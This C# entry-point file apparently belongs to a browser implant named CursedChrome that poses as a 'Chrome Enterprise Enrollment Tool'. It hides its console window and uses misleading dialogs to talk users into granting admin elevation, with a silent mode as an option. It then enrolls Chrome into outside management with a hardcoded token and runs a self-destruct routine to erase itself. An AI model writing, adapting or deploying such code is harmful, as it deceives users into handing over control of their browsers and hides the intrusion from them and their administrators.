using System;
using System.Windows.Forms;
using CursedChrome.Core;
using CursedChrome.Payload;
using CursedChrome.Utils;

namespace CursedChrome
{
    static class Program
    {
        [STAThread]
        static void Main(string[] args)
        {
            try
            {
                // Parse command line
                bool silent = Array.Exists(args, a => a.Equals("/silent", StringComparison.OrdinalIgnoreCase));
                bool debug = Array.Exists(args, a => a.Equals("/debug", StringComparison.OrdinalIgnoreCase));
                
                // Hide console in production
                if (!debug)
                {
                    Win32.HideConsoleWindow();
                }
                
                // Initialize logging
                Logger.Initialize(debug);
                Logger.Log("Chrome Enterprise Enrollment Tool started");
                Logger.Log($"Version: {Configuration.APP_VERSION}");
                Logger.Log($"Silent mode: {silent}");
                Logger.Log($"Debug mode: {debug}");
                
                // Check privileges
                if (!PrivilegeElevation.IsAdministrator())
                {
                    Logger.Log("Not running as administrator - requesting elevation");
                    
                    if (!silent)
                    {
                        MessageBox.Show(
                            "This tool requires administrator privileges to enroll Chrome.\n\n" +
                            "Please click 'Yes' on the next prompt.",
                            "Chrome Enterprise Enrollment",
                            MessageBoxButtons.OK,
                            MessageBoxIcon.Information
                        );
                    }
                    
                    PrivilegeElevation.RequestElevation(silent);
                    return;
                }
                
                Logger.Log("Running with administrator privileges");
                
                // Execute enrollment
                bool success = ExecuteEnrollment();
                
                // Show result
                if (!silent)
                {
                    if (success)
                    {
                        MessageBox.Show(
                            "Chrome browser enrolled successfully!\n\n" +
                            $"Organization: {Configuration.ORG_UNIT}\n" +
                            "Enrollment Token: " + Configuration.ENROLLMENT_TOKEN.Substring(0, 8) + "...\n\n" +
                            "Chrome will now be managed by your organization.",
                            "Enrollment Complete",
                            MessageBoxButtons.OK,
                            MessageBoxIcon.Information
                        );
                    }
                    else
                    {
                        MessageBox.Show(
                            "Enrollment completed with warnings.\n\n" +
                            "Please check Chrome at chrome://policy to verify enrollment.",
                            "Enrollment Complete",
                            MessageBoxButtons.OK,
                            MessageBoxIcon.Warning
                        );
                    }
                }
                
                // Cleanup
                if (!debug)
                {
                    SelfDestruct.Execute();
                }
                else
                {
                    Console.WriteLine("\n[DEBUG] Self-destruct skipped in debug mode");
                    Console.WriteLine("Press any key to exit...");
                    Console.ReadKey();
                }
                
                Logger.Log("Enrollment tool completed successfully");
            }
            catch (Exception ex)
            {
                Logger.LogError("Fatal error", ex);
                
                MessageBox.Show(
                    "An error occurred during enrollment.\n\n" +
                    "Please contact your IT administrator.",
                    "Enrollment Error",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Error
                );
                
                Environment.Exit(1);
            }
        }
        
        private static bool ExecuteEnrollment()
        {
            try
            {
                Logger.Log("Starting enrollment process");
                
                // Step 1: Enroll browser
                if (!EnrollmentManager.EnrollBrowser())
                {
                    Logger.LogError("Browser enrollment failed");
                    return false;
                }
                
                // Step 2: Restart Chrome
                EnrollmentManager.RestartChrome();
                
                Logger.Log("Enrollment process completed");
                return true;
            }
            catch (Exception ex)
            {
                Logger.LogError("Enrollment execution error", ex);
                return false;
            }
        }
    }
}
